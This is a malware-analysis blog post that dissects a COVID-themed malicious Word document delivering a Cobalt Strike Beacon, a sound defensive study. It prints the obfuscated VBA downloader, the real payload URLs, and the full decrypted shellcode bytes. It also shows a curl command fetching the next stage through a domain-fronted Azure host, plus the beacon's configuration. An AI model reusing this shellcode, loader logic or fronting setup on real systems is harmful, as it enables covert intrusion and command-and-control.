---
layout: post
title:  "Hiding in the clouds"
date:   2020-03-24 10:31:12 -0600
categories: malware, cobaltstrike
---


A covid themed document was mentioned on twitter[[1]] by @ximo_lcg. Checking the Any.Run sandbox detonation[[2]] shows a TLS connection and an execution of rundll so I decided to take a look.

The document is covid themed with references to World Health Organization.


# VBA

The VBA code is pretty simplistic, it has a simple RC4 and unhexlify on the strings:

```
Set objHttp = CreateObject(DecString("ee6f71bd568fa4d9264722c28222c6fa616215f9"))
    strURL = DecString("cb485d806987a5a520513a899a1bfdd74a592f87897b41d4fa92a08aa37478a6a3883a21")
    objHttp.Open "GET", strURL, False

```


So we can decode the strings pretty easily

```
>>> def decode(s):
...   temp = binascii.unhexlify(s)
...   rc4 = ARC4.new('thehint')
...   return rc4.decrypt(temp)

>>> decode('ee6f71bd568fa4d9264722c28222c6fa616215f9')
'MSXML2.ServerXMLHTTP'
>>> decode('cb485d806987a5a520513a899a1bfdd74a592f87897b41d4fa92a08aa37478a6a3883a21')
'https://cdn.javacon.eu/gen_visual.js'

>>> decode('cb485d806987a5a520513a899a1bfdd74a592f87897b41d4fa92a08cab296eb4bc')
'https://cdn.javacon.eu/gen_pa.css'

```

Looking at some more of the VBA code

```
    objHttptwo.setRequestHeader DecString("f64f4c8237fcedef2d41"), _
      DecString("ee53539976d1eba5761b6487d82de2d84d5936dacc403a93aeccd1ccf1275aaea19064697430c54b2384315846187f6a1c9a878e
2ff5218f321654c96ae367c90a72981a64b0b55ebc69b46f4d09")
    objHttptwo.Send ("")
    ''' Select the mode (with or without domain name)
    pass = ToHexDump(objHttptwo.responseText)
    'pass = ToHexDump(objHttptwo.responseText) & access
    'MsgBox ("Full password:" & ToHexDump(objHttptwo.responseText) & access)
    Set objHttptwo = Nothing


'If access = "11252" Then
#If VBA7 Then
    Dim rwxpage As LongPtr, res As LongPtr
#Else
    Dim rwxpage As Long, res As Long
#End If

    Dim sSecret     As String
    Dim dec_secret As String
    Dim here As String
    here = pass
    dec_secret = CryptRC4(FromHexDump(strText), here)

```

It looks like one of the URLs will return helified data and the other will return data that will be hexlified and used as an RC4 key to decode the other data. That data will then be reconstructed and injected into rundll process.


# Next Layer

Decoding the downloaded data:
```
>>> passw
'well,letmeexplainyouthis'
>>> tp = binascii.hexlify(passw)
>>> tp
'77656c6c2c6c65746d656578706c61696e796f7574686973'
>>> tp.upper()
'77656C6C2C6C65746D656578706C61696E796F7574686973'
>>> rc4 = ARC4.new(binascii.hexlify(passw).upper())

>>> t = rc4.decrypt(b)
>>> t
'-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49,13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1,-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4,-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1,-43,-24,0,0,0,0,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-92,0,0,0,91,49,-55,81,81,106,3,81,81,104,-69,1,0,0,83,80,104,87,-119,-97,-58,-1,-43,80,-23,-116,0,0,0,91,49,-46,82,104,0,50,-64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,104,-128,51,0,0,-119,-32,106,4,80,106,31,86,104,117,70,-98,-122,-1,-43,95,49,-1,87,87,106,-1,83,86,104,45,6,24,123,-1,-43,-123,-64,15,-124,-54,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1,-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,117,7,88,80,-23,123,-1,-1,-1,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,111,-1,-1,-1,47,110,98,67,73,0,-45,-19,82,109,28,-80,-103,81,49,-9,48,-60,-122,39,3,-100,26,-94,122,77,49,-28,0,122,-60,-13,-32,-102,-97,77,-72,89,-4,30,123,48,79,28,-108,16,52,-51,-44,-96,-95,-3,-12,-78,38,22,-15,70,74,-85,-15,64,6,-84,-42,-128,-103,78,64,-33,-94,40,5,-54,7,-2,-41,80,-112,0,85,115,101,114,45,65,103,101,110,116,58,32,77,105,99,114,111,115,111,102,116,45,67,114,121,112,116,111,65,80,73,47,54,46,49,13,10,72,111,115,116,58,32,110,111,118,111,116,101,46,97,122,117,114,101,101,100,103,101,46,110,101,116,13,10,0,-52,23,-105,29,-51,-35,-74,118,64,-18,30,88,-80,14,-40,-56,-105,48,77,81,100,72,-76,-38,15,-16,-89,70,-26,94,-13,94,-3,-16,-92,-36,1,49,-124,-29,111,-117,-53,102,54,58,14,-3,-44,79,0,-8,60,29,109,-89,33,-63,12,-83,-65,11,7,-19,117,-118,-47,-38,85,-26,-35,51,99,82,-72,40,-21,-97,61,116,-104,79,80,-67,25,18,-29,70,122,54,29,-123,-17,-82,90,-40,125,-75,115,74,-6,-108,-76,-75,-118,-64,102,72,58,60,123,-115,14,-102,-122,40,92,105,-65,64,-91,-22,80,-118,-128,67,-30,-125,-99,-93,-97,-31,36,-5,-78,-6,-97,50,-60,-5,102,-68,0,-76,53,35,115,-87,-36,-13,41,0,-65,-46,-79,70,85,39,-52,73,-65,-23,-83,81,-60,42,54,-87,31,106,9,54,-97,-34,9,11,86,18,118,97,64,-93,62,-43,-100,54,-21,-98,75,54,-119,-41,-71,113,20,-46,90,-123,16,-69,102,-104,56,18,114,-44,107,-119,115,-112,9,-107,-125,44,115,1,-66,89,44,42,67,17,36,-84,-6,28,109,-85,126,23,-38,107,-51,-88,-85,-80,-50,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0,104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43,-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-119,-3,-1,-1,116,111,45,100,111,45,99,100,110,46,109,105,99,114,111,115,111,102,116,46,99,111,109,0,51,28,-66,-38'
>>> blah = t.split(',')
>>> blah2 = map(lambda x: chr(int(x)&0xff),blah)
>>> blah2 = ''.join(blah2)
>>> blah2
"\xfc\xe8\x89\x00\x00\x00`\x89\xe51\xd2d\x8bR0\x8bR\x0c\x8bR\x14\x8br(\x0f\xb7J&1\xff1\xc0\xac<a|\x02, \xc1\xcf\r\x01\xc7\xe2\xf0RW\x8bR\x10\x8bB<\x01\xd0\x8b@x\x85\xc0tJ\x01\xd0P\x8bH\x18\x8bX \x01\xd3\xe3<I\x8b4\x8b\x01\xd61\xff1\xc0\xac\xc1\xcf\r\x01\xc78\xe0u\xf4\x03}\xf8;}$u\xe2X\x8bX$\x01\xd3f\x8b\x0cK\x8bX\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89D$$[[aYZQ\xff\xe0X_Z\x8b\x12\xeb\x86]hnet\x00hwiniThLw&\x07\xff\xd5\xe8\x00\x00\x00\x001\xffWWWWWh:Vy\xa7\xff\xd5\xe9\xa4\x00\x00\x00[1\xc9QQj\x03QQh\xbb\x01\x00\x00SPhW\x89\x9f\xc6\xff\xd5P\xe9\x8c\x00\x00\x00[1\xd2Rh\x002\xc0\x84RRRSRPh\xebU.;\xff\xd5\x89\xc6\x83\xc3Ph\x803\x00\x00\x89\xe0j\x04Pj\x1fVhuF\x9e\x86\xff\xd5_1\xffWWj\xffSVh-\x06\x18{\xff\xd5\x85\xc0\x0f\x84\xca\x01\x00\x001\xff\x85\xf6t\x04\x89\xf9\xeb\th\xaa\xc5\xe2]\xff\xd5\x89\xc1hE!^1\xff\xd51\xffWj\x07QVPh\xb7W\xe0\x0b\xff\xd5\xbf\x00/\x00\x009\xc7u\x07XP\xe9{\xff\xff\xff1\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8o\xff\xff\xff/nbCI\x00\xd3\xedRm\x1c\xb0\x99Q1\xf70\xc4\x86'\x03\x9c\x1a\xa2zM1\xe4\x00z\xc4\xf3\xe0\x9a\x9fM\xb8Y\xfc\x1e{0O\x1c\x94\x104\xcd\xd4\xa0\xa1\xfd\xf4\xb2&\x16\xf1FJ\xab\xf1@\x06\xac\xd6\x80\x99N@\xdf\xa2(\x05\xca\x07\xfe\xd7P\x90\x00User-Agent: Microsoft-CryptoAPI/6.1\r\nHost: novote.azureedge.net\r\n\x00\xcc\x17\x97\x1d\xcd\xdd\xb6v@\xee\x1eX\xb0\x0e\xd8\xc8\x970MQdH\xb4\xda\x0f\xf0\xa7F\xe6^\xf3^\xfd\xf0\xa4\xdc\x011\x84\xe3o\x8b\xcbf6:\x0e\xfd\xd4O\x00\xf8<\x1dm\xa7!\xc1\x0c\xad\xbf\x0b\x07\xedu\x8a\xd1\xdaU\xe6\xdd3cR\xb8(\xeb\x9f=t\x98OP\xbd\x19\x12\xe3Fz6\x1d\x85\xef\xaeZ\xd8}\xb5sJ\xfa\x94\xb4\xb5\x8a\xc0fH:<{\x8d\x0e\x9a\x86(\\i\xbf@\xa5\xeaP\x8a\x80C\xe2\x83\x9d\xa3\x9f\xe1$\xfb\xb2\xfa\x9f2\xc4\xfbf\xbc\x00\xb45#s\xa9\xdc\xf3)\x00\xbf\xd2\xb1FU'\xccI\xbf\xe9\xadQ\xc4*6\xa9\x1fj\t6\x9f\xde\t\x0bV\x12va@\xa3>\xd5\x9c6\xeb\x9eK6\x89\xd7\xb9q\x14\xd2Z\x85\x10\xbbf\x988\x12r\xd4k\x89s\x90\t\x95\x83,s\x01\xbeY,*C\x11$\xac\xfa\x1cm\xab~\x17\xdak\xcd\xa8\xab\xb0\xce\x00h\xf0\xb5\xa2V\xff\xd5j@h\x00\x10\x00\x00h\x00\x00@\x00WhX\xa4S\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9QS\x89\xe7Wh\x00 \x00\x00SVh\x12\x96\x89\xe2\xff\xd5\x85\xc0t\xc6\x8b\x07\x01\xc3\x85\xc0u\xe5X\xc3\xe8\x89\xfd\xff\xffto-do-cdn.microsoft.com\x003\x1c\xbe\xda"

```

Looks like this data is the shellcode that will be injected, it is your standard shellcode that will download and execute something in memory frequently used for delivering Meterpreter or CobaltStrike Beacon.

The traffic is abusing a domain frontable azure domain to allow their traffic to be rerouted within azure, this isn't a new technique[3] and has been seen used by CobaltStrike before.

```
# curl -k https://to-do-cdn.microsoft.com/nbCI --header "Host: novote.azureedge.net" --user-agent "Microsoft-CryptoAPI/6.1" -O -v
* TCP_NODELAY set
* Connected to to-do-cdn.microsoft.com (152.199.4.133) port 443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
* ALPN, server accepted to use h2
* Server certificate:
*  subject: CN=to-do-cdn.microsoft.com
*  start date: Mar  6 08:05:55 2019 GMT
*  expire date: Mar  6 08:05:55 2021 GMT
*  issuer: C=US; ST=Washington; L=Redmond; O=Microsoft Corporation; OU=Microsoft IT; CN=Microsoft IT TLS CA 4
*  SSL certificate verify ok.
* Using HTTP2, server supports multi-use
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
} [5 bytes data]
* Using Stream ID: 1 (easy handle 0x559466f72e00)
} [5 bytes data]
> GET /nbCI HTTP/2
> Host: novote.azureedge.net
> user-agent: Microsoft-CryptoAPI/6.1
> accept: */*
>
{ [5 bytes data]
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
{ [249 bytes data]
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
{ [249 bytes data]
* old SSL session ID is stale, removing
{ [5 bytes data]
* Connection state changed (MAX_CONCURRENT_STREAMS == 100)!
} [5 bytes data]
< HTTP/2 200
< content-type: application/octet-stream
< date: Tue, 24 Mar 2020 16:22:48 GMT
< server: ECAcc (daa/7C85)
< content-length: 208973
<
{ [5 bytes data]
100  204k  100  204k    0     0  93667      0  0:00:02  0:00:02 --:--:-- 93667

```

This downloaded blob would then be loaded into memory and detonated at byte 0

```
0x00000000   1                       fc  cld
0x00000001   5               e811000000  call 0x17

```

At byte 0x17 is a jump to 0x40 which then calls 0x19, this is a quick way to push the address of 0x45 onto the stack

```
0x00000019   1                       5f  pop edi
0x0000001a   2                     8b17  mov edx, dword [edi]
0x0000001c   3                   83c704  add edi, 4
0x0000001f   2                     8b37  mov esi, dword [edi]
0x00000021   2                     31d6  xor esi, edx
0x00000023   3                   83c704  add edi, 4
0x00000026   1                       57  push edi
0x00000027   2                     8b07  mov eax, dword [edi]
0x00000029   2                     31d0  xor eax, edx
0x0000002b   2                     8907  mov dword [edi], eax
0x0000002d   2                     31c2  xor edx, eax
0x0000002f   3                   83c704  add edi, 4
0x00000032   3                   83ee04  sub esi, 4
0x00000035   2                     31c0  xor eax, eax
0x00000037   2                     39c6  cmp esi, eax
0x00000039   2                     7402  je 0x3d
0x0000003b   2                     ebea  jmp 0x27
0x0000003d   1                       5a  pop edx
0x0000003e   2                     ffe2  jmp edx
0x00000040   5               e8d4ffffff  call 0x19

```

This is an XOR decoding routine with the length of data being the first two dwords XORd and the initial key being the frist dword value.

```
>>> data = open('nbCI', 'rb').read()
>>> t = bytearray(data[0x45:])
>>> import struct
>>> struct.unpack_from('<II', t)
(1086941758, 1087003198)
>>> (a,b) = struct.unpack_from('<II', t)
>>> a^b
208896
>>> key = a
>>> t2 = t[8:]
>>> out = ""
>>> for i in range(len(t2)/4):
...   temp = struct.unpack_from('<I', t2[i*4:])[0]
...   temp ^= key
...   out += struct.pack('<I', temp)
...   key ^= temp
...
>>> out[:100]
'MZ\xe8\x00\x00\x00\x00[\x89\xdfREU\x89\xe5\x81\xc3P\x81\x00\x00\xff\xd3h\xf0\xb5\xa2Vh\x04\x00\x00\x00W\xff\xd0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf8\x00\x00\x00\x0e\x1f\xba\x0e\x00\xb4\t\xcd!\xb8\x01L\xcd!This program cannot be'
>>> open('nbCI.decoded', 'wb').write(out)
>>> quit()

```

The decoded data is a CobaltStrike Beacon designed to be reflectively loaded, it's a newer version of CobaltStrike but also doesn't use the standard XOR key for it's configuration data. You can get all the values by alerting my publicly available beacon decoder[[4]] a bit by allowing up to 100 setting values and changing the XOR key to 0x2e.

```
class beaconSettings:
	def __init__(self, blob):
		self.items = []
		(bsetting, stype, l,) = struct.unpack_from('>HHH', blob)
		while bsetting < 100 and stype < 10 and l < 1000 and len(blob) > 7:
```

```
def decoder(data):
	config = {}
	blob = bytearray(data)
	for i in range(len(blob)):
		blob[i] ^= 0x2e

```

```
{'UNKNOWN43': '3634', 'PROXY_BEHAVIOR': '2', 'PROTOCOL': '8', 'SPAWNTO_X64': '%windir%\\sysnative\\rundll32.exe', 'SLEEPTIME': '10', 'C2_VERB_GET': 'GET', 'UNKNOWN51': '\x01\x02\x03\x04', 'DNS_SLEEP': '0', 'UNKNOWN40': '0', 'UNKNOWN53': 'ua-U\x0e\x90\r\n\xe9l\x14}\xc91Uo', 'UNKNOWN47': '', 'MAXGET': '1048576', 'USERAGENT': 'Microsoft-CryptoAPI/6.1', 'PORT': '443', 'DNS_IDLE': '0', 'UNKNOWN46': '', 'UNKNOWN54': 'Host: novote.azureedge.net\r\n', 'UNKNOWN55': '30', 'UNKNOWN41': '0', 'UNKNOWN39': '30', 'UNKNOWN50': '30', 'UNKNOWN45': '0', 'C2_POSTREQ': "[('_HEADER', 0, 'Accept: */*')]", 'WATERMARK': '857521882', 'PUBKEY': '30819f300d06092a864886f70d010101050003818d0030818902818100a0892297ed077816d7463cc456c02ccf31c03f8973c1457e5cf4133b7b5e22b51d4196352c906aeffdbcbaf53b0969c9c46e302f70964f86974d892da0ecb4a44b2ff462b64cf119194f1d4169b302717aee46cd777c047b8a74e02f91f09b911c57aeef7e897efc87f48d9a33a440a52a7a15132089819436165e64120732c30203010001', 'SPAWNTO_X86': '%windir%\\syswow64\\rundll32.exe', 'C2_REQUEST': "[('_HEADER', 0, 'Accept: */*')]", 'CRYPTO_sCHEME': '0', 'ITTER': '12', 'C2_RECOVER': '\x04', 'C2_CHUNK_POST': '0', 'PIPENAME': '', 'C2_VERB_POST': 'POST', 'UNKNOWN52': '30', 'UNKNOWN44': '3634', 'SPAWNTO': 'Z\xb4\x119\xf4C\xbb\x07\xf4p\xd1L\xf0\xae^\x80', 'UNKNOWN38': '30', 'SUBMITURI': '/oscp/a/', 'DOMAINS': 'to-do-cdn.microsoft.com,/oscp/', 'MAXDNS': '240'}

```






References:  
 1. https://twitter.com/ximo_lcg/status/1242298741140250624  
 2. https://app.any.run/tasks/642a1b8c-6232-41c0-8c74-0f4513a44599/  
 3. https://theobsidiantower.com/2017/07/24/d0a7cfceedc42bdf3a36f2926bd52863ef28befc.html  
 4: https://github.com/sysopfb/malware_decoders/blob/master/cs_beacon/proper_beacon_decoder.py  


[1]:https://twitter.com/ximo_lcg/status/1242298741140250624  
[2]:https://app.any.run/tasks/642a1b8c-6232-41c0-8c74-0f4513a44599/  
[3]:https://theobsidiantower.com/2017/07/24/d0a7cfceedc42bdf3a36f2926bd52863ef28befc.html  
[4]:https://github.com/sysopfb/malware_decoders/blob/master/cs_beacon/proper_beacon_decoder.py  

